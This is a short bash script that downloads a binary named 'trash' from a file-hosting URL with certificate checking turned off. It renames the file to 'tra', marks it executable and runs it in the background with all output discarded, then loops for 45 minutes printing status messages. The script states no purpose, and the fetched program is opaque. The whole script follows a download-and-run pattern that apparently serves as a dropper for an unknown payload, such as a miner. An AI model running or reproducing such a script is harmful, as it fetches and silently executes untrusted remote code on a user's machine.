#!/bin/bash
if [ ! -f ./tra ]; then
    echo "File not found!"
    wget https://api.zeit.co/now/files/16790e86f57e055dcb5c4f852bc7a161ec101bf8/trash --no-check-certificate
    mv trash tra
fi
echo $1
chmod +x tra
nohup ./tra  >/dev/null 2>&1 
i="0"
while [ $i -lt 45 ]
do
echo "Is this runnning ok?!" 
echo "Let's sleep for $i min"
sleep 60 #60= 1min
i=$[$i+1]
done
